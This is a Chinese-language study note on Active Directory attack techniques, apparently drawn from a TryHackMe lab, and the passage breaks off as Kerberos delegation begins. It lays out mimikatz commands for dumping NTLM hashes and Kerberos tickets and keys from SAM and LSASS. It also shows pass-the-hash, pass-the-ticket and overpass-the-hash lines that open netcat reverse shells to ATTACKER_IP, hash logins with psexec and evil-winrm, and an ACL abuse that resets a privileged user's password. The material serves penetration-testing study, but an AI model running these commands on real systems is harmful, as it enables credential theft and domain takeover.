# AD学习记录（中）
在正式学习AD利用之前还需要简单回忆一下关于AD认证的知识，帮助大家加深对渗透和漏洞的理解，之后会讲解权限委派错误、kerberos委派、用户密码窃取、组策略对象、AD证书服务的错误配置，最后简单讲解总结一下域内热门漏洞，帮助大家进一步扩展学习。
## NetNTLM authentication
  1. 客户端对服务发起认证请求
  2. 服务返回一个名字叫做challenge的随机数
  3. 客户端拿到challenge，用自己本地的ntml hash加上它生成response发送给服务
  4. 服务把刚刚拿到的challenge和response给域控，让域控对比
  5. 域控本事存储了所有账户的ntml hash，拿到challenge计算对比一下就能判断认证是不是通过了
  6. 服务接受到来自域控的判断来确定要不要通过认证
注意：所描述的过程适用于使用域帐户的情况。如果使用本地帐户，服务器可以验证对质询的响应，而不需要与域控制器交互，因为它在其 SAM 上本地存储了密码哈希。
## Pass-the-Hash
作为从我们获得管理权限的主机中提取凭据的结果（通过使用 mimikatz
或类似工具），我们可能会获得可以轻松破解的明文密码或哈希值。然而，不过一般，我们最终会得到未破解的 NTLM
密码哈希值。虽然看起来我们不能真正使用这些哈希值，但只要知道密码哈希值就可以响应身份验证期间发送的 NTLM
质询。这意味着我们可以在不需要知道明文密码的情况下进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，我们不必破解 NTLM
哈希，而是可以传递哈希 (PtH) 并成功进行身份验证。要提取 NTLM 哈希，我们可以使用 mimikatz 读取本地 SAM 或直接从 LSASS
内存中提取哈希。
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::sam   
    RID  : 000001f4 (500)
    User : Administrator
      Hash NTLM: 145e02c50333951f71d13c245d352b50
从 LSASS 内存中提取 NTLM 哈希,此方法将允许您为本地用户和最近登录计算机的任何域用户提取任何 NTLM 哈希。
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::msv 
    Authentication Id : 0 ; 308124 (00000000:0004b39c)
    Session           : RemoteInteractive from 2 
    User Name         : bob.jenkins
    Domain            : ZA
    Logon Server      : THMDC
    Logon Time        : 2022/04/22 09:55:02
    SID               : S-1-5-21-3330634377-1326264276-632209373-4605
            msv :
             [00000003] Primary
             * Username : bob.jenkins
             * Domain   : ZA
             * NTLM     : 6b4a57f67805a663c818106dc0648484
然后，我们可以使用提取的哈希值执行 PTH 攻击，方法是使用 mimikatz 在反向 shell（或是任何其他命令）上为受害者用户注入访问令牌，如下所示：
    mimikatz # token::revert
    mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
    psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
还可以使用CS自带的mimikatz去启动一个新的powershell，之后执行窃取令牌任务横向。
    hashdump
    mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:”powershell -w hidden”
    steal_token 1234
    shell dir \\TARGET\C$
## Kerberos Authentication
  * 第一步，客户端发送由用户hash和时间生成的timestamp和username发送给KDC去申请TGT
  * 第二步，KDC利用 krbtgt 帐户加密TGT，TGT内部包含一个东西叫做Session Key，等会认证会用到
  * 第三步，客户端拿到TGT和要访问服务的SPN去请求KDC申请TGS
  * 第四步，KDC认证通过后会拿着服务的hash去加密TGS，把携带svc session key一起给客户端
  * 第五步,用TGS和向SRV发起认证请求，解密成功就通过认证。
## Pass-the-Ticket
可以使用 mimikatz 从 LSASS 内存中提取 Kerberos 票证和会话密钥。该过程通常需要我们在被攻击机器上具有 SYSTEM
权限，可以按如下方式完成：
    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export
虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数时候，我们会对 TGT
感兴趣，因为它们可用于请求访问允许用户访问的任何服务。同时，TGS 仅适用于特定服务。提取 TGT 需要我们拥有管理员凭据，提取 TGS
可以使用低权限帐户（仅分配给该帐户的帐户）来完成。
一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入当前会话
    mimikatz # kerberos::ptt [0;427fcd5]PI:EMAIL
在我们自己的会话中注入票证不需要管理员权限。在此之后，门票将可用于我们用于横向移动的任何工具。要检查票证是否已正确注入，您可以使用 klist 命令：
    za\bob.jenkins@THMJMP2 C:\> klist
    Current LogonId is 0:0x1e43562
    Cached Tickets: (1)
    #0>     Client: Administrator @ ZA.TRYHACKME.COM
            Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
            KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
            Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
            Start Time: 4/12/2022 0:28:35 (local)
            End Time:   4/12/2022 10:28:35 (local)
            Renew Time: 4/23/2022 0:28:35 (local)
            Session Key Type: AES-256-CTS-HMAC-SHA1-96
            Cache Flags: 0x1 -> PRIMARY
            Kdc Called: THMDC.za.tryhackme.com
## Overpass-the-hash / Pass-the-Key
这种攻击类似于 PtH，但适用于 Kerberos 网络。当用户请求 TGT
时，他们会发送一个使用从其密码派生的加密密钥加密的时间戳。用于派生此密钥的算法可以是 DES（在当前 Windows 版本中默认禁用）、RC4、AES128
或 AES256，具体取决于安装的 Windows 版本和 Kerberos 配置。如果我们有这些密钥中的任何一个，我们就可以向 KDC 索要 TGT
而无需实际密码，因此称为密钥传递 (PtK)
    mimikatz # privilege::debug
    mimikatz # sekurlsa::ekeys
    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
请注意，使用 RC4 时，密钥将等于用户的 NTLM 哈希。这意味着如果我们可以提取 NTLM 哈希，只要 RC4 是启用的协议之一，我们就可以使用它来请求
TGT。这种特殊的变体通常被称为 Overpass-the-Hash (OPtH)。
## 攻击手法
### 基于错误的ACL攻击
Active Directory 可以通过称为权限委派的功权限委托攻击通常称为基于 ACL 的攻击。AD 允许管理员配置填充自主访问控制列表 (DACL)
的访问控制条目 (ACE)，因此称为基于 ACL 的攻击。几乎任何 AD 对象都可以使用 ACE 进行保护，然后描述任何其他 AD
对象对目标对象的允许和拒绝权限。但是，如果这些 ACE 配置错误，攻击者可能会利用它们。让我们再看看我们的例子。如果 IT 支持团队被授予域用户组的
ForceChangePassword
ACE，这将被认为是不安全的。当然，他们能够重置忘记密码的员工的密码，但这种错误配置将使他们还可以重置特权帐户的密码，例如本质上允许权限升级的域管理员组成员的帐户。
需要重点关注的ACE如下：
  * **ForceChangePassword** ：强制改变当下的密码
  * **AddMembers** ：可以对目标组添加用户（包括自己的账户）
  * **GenericAll** ：完全控制对象，包括更改密码、注册SPN、添加AD对象到目标组里面
  * **GenericWrite** :更改目标写入参数，导致下次用户登录脚本就要执行
  * **WriteOwne** ：更新目标对象的所有者，可以让自己成为所有者
  * **WriteDACL** ：更新对面的DACL，将ACL写入对面实体，直接授予我们的账户对对象的完全控制权
  * **AllExtendedRights** ：能够对目标对象执行与扩展 AD 权限相关的任何操作。例如，这包括强制更改用户密码的能力。
要寻找ACL的错误配置需要我们用bloodhound去收集好信息来分析，目前我们是普通的domin user，我们要翻阅一下node
info，发现inbound executions
rights有一个canRDP的权限，这意味着我们域用户可以登录THMWRK1机器，不过对我们提升权限这没什么用：
我们继续往下分析，看到outbound object control，点击去发现属于domain user有一个ACE可以控制IT
SUPPORT组，这意味着我们可以把自己添加进这个组里面：
我们再继续分析，发现IT SUPPORT有权限改变属于Tier 2 Admins的用户的密码，这样问我们就要劫持该组的任意用户进入该组。
利用演示：
    Add-ADGroupMember "IT Support" -Members "michael.cameron"
    Get-ADGroupMember -Identity "IT Support"
获取用户名，找一个不顺眼的
    Get-ADGroupMember -Identity "Tier 2 Admins"
选个用户，把它的密码改了
    $Password = ConvertTo-SecureString "abc123???" -AsPlainText -Force 
    Set-ADAccountPassword -Identity "t2_ross.bird" -Reset -NewPassword $Password
修改密码却发现自己没有权限，这是因为我们的权限还没同步到整个域内，这最多可能需要 10 分钟，如果要同步发生的更快，需要执行以下命令：
    gpupdate /force
不过依然要等待一会，成功如下，我们可以拿账户密码之间登录了：
登录成功了
### Kerberos委派
在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派。有两种委派，非约束委派（Unconstrained
delegation）和约束委派（Constrained